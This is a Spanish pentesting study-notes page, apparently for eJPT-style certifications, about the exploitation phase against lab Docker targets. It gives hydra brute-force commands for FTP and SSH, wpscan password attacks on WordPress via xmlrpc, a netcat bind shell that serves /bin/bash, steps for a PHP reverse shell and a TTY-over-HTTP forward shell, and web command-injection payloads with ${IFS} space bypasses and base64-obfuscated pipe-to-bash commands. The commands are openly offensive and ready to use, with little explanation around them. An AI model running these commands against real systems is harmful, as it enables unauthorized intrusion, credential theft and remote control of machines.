## Explotación
### Indice
- [FTP](#exftp)
- [SSH](#exssh)
- [HTTP SSL](#exssl)
- [Wordpress](#exwp)
- [Reverse Shell](#shell)
- [Inyeccion comandos](#inyeccion_comandos)
 <a name="exftp"></a>
### FTP
 
Dockers de pruebas
```
1. https://github.com/garethflowers/docker-ftp-server
2. https://github.com/metabrainz/docker-anon-ftp
```

Fuerza bruta: ``` hydra -l user -P passwords.txt ftp://172.17.0.2```

 * Con -l le especificamos un usuario, con -L le especificamos un diccionario de usuarios. igual para la contraseña
 
Si aparece la version, se podría mirar algun exploit.
 
<a name="exssh"></a>
 ### SSH
 
Docker de pruebas ```https://hub.docker.com/r/linuxserver/openssh-server ```
Fuerza bruta: ``` hydra -l user -P passwords.txt ssh://172.17.0.2 -s 2222```

 <a name="exssl"></a>
## HTTPS SSL

 Docker de pruebas
 ```https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160```
  
 Ver vulnerabilidades en certificados SSL:
 ```sslscan google.com:443```  
 algunas maquinas son vulnerables a Heartbleed, lo que consigue hacer un dump de la memoria en la que podemos llegar a encontrar claves privadas, nombres de usuario, contraseñas...

<a name="exwp"></a>
 ## Wordpress
 
Credenciales por fuerza bruta abusando de xmlrpc
 ```
 wpscan --url <ip> -U <usuario encontrado> -P /ruta/al/rockyou.txt
 ```
 
Credenciales por fuerza bruta abusando de xmlrpc
 ```
 wpscan --url <ip> -U <usuario encontrado> -P /ruta/al/rockyou.txt
 ```

 ## Reverse, Bind, Forward Shells
 
 Suponiendo que conseguimos realizar ejecución remota de comandos, podriamos tratar de enviarnos una shell interactiva desde la cual movernos por el sistema atacado. Tenemos 3 tipos:
 <a name="shell"></a>
 ### Reverse shell
 La víctima nos envía una shell interactiva a nosotros, que estremos a la escucha con netcat. En [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) tenemos diferentes maneras de ejecutar la shell remota según los recursos que dispongamos. Solamente deberíamos estar a la escucha con netcat de la siguiente manera:
 ```
 nc -nlvp 443
 ```
 ### Bind shell
 La conexión es igual que la anterior solo que de manera inversa. en este caso el atacante es el que está a la escucha pero ofreciendo una bash, para ello:
 ```
 Victima: nc -nlvp 443 -e /bin/bash
 Atacante: nc <ip> <puerto>
 ```
 
 ### Forward Shell
 Es una manera de evitar las restricciones que pudieramos tener a la hora de establecer una conexión, por ejemplo si a través de fiewall nos capasen los puertos. La consola no es 100% interactiva pero se puede simular.
 
 Para ello necesitamos poder subir archivos, y subiriamos el php reverse shell de pentestmonkey. y nos descargamos el siguiente ejecutable: [TTYoverHTTP](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py) 
 la manera de proceder es la siguiente:
 ```
 1. subir el fichero cmd.php (o como le queramos llamar)
 2. Editar si fuera necesario el ttyoverhttp, con la ruta y el nombre del fichero para decirle donde se ubica el php reverse shell
 3. Ejecutar tty_over_http.py
 ```


 <a name="inyeccion_comandos"></a>
### Inyección de comandos WEB  

hay varias maneras de inyectar comandos, por ejemplo en burpsuite. Si identificamos un campo, lugar donde creemos que se pueda inyectar comandos, aquí se listan varias opciones para hacerlo.  
```
$(comando)
;comando
;comando;
;comando;#

No todos los comandos funcionan, probar con: id, whoami, ps, ls ...
```

Si no nos permite espacios:  
```
Cambiamos el espacio por ${IFS} ejemplo:
echo${IFS}hola${IFS}mundo
```

Conversión a base64 (para evitar el error con caracteres no permitidos, como el &)
```
# Bash B64 Ofuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 
```
<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
